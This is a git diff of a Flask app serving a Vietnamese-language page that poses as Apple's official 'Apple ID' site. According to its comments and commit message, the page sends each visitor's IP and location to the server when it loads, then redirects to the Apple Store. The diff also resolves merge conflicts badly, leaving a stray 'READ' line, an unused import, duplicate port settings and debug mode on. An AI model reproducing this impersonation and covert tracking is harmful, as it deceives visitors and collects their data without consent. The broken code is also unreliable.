@@ -1,3 +1,4 @@
+from gzip import READ
 from flask import Flask, Response, request, jsonify
 
 app = Flask(__name__)
@@ -138,23 +139,26 @@ HTML_PAGE = '''
     <h1>Apple ID</h1>
     <p class="description">Confirm opening Apple website</p>
     <button class="verify-button" id="verifyBtn">Submit</button>
+
+<script>
+  document.getElementById("verifyBtn").addEventListener("click", function () {
+    window.location.href = "https://www.apple.com/shop";
+  });
+</script>
+
     <div id="status"></div>
     <a href="https://www.apple.com/legal/internet-services/itunes/vn/terms.html" target="_blank" style="font-size:13px; color:#0071e3; text-decoration:none; display:block; margin-top:10px;">
       Điều khoản & Dịch vụ của Apple
     </a>
- HEAD
   </div>
  </div>
   <div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
   Website chính thức của apple
   </a>
-
- 6cc5c18 (Push IP to backend + redirect to Apple Shop)
   </div>
 </div>
 
 <div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
-  Website chính thức của apple
 </div>
 
 <!-- Gửi IP về server khi trang vừa tải -->
@@ -189,8 +193,6 @@ HTML_PAGE = '''
     window.location.href = "https://www.apple.com/shop/";
   });
 </script>
-
-<<<<<<< HEAD
   <script>
   // Gửi IP + vị trí ngay khi trang vừa tải
   window.addEventListener('DOMContentLoaded', async () => {
@@ -224,9 +226,6 @@ HTML_PAGE = '''
   });
 </script>
 
-=======
->>>>>>> 6cc5c18 (Push IP to backend + redirect to Apple Shop)
-
 </body>
 </html>
 '''
@@ -254,10 +253,9 @@ def submit():
 if __name__ == '__main__':
     import os
 
-HEAD
+READ
 port = int(os.environ.get("PORT", 10000))
 
 port = int(os.environ.get("PORT", 10001))
-6cc5c18 (Push IP to backend + redirect to Apple Shop)
 app.run(host='0.0.0.0', port=port, debug=True)
 
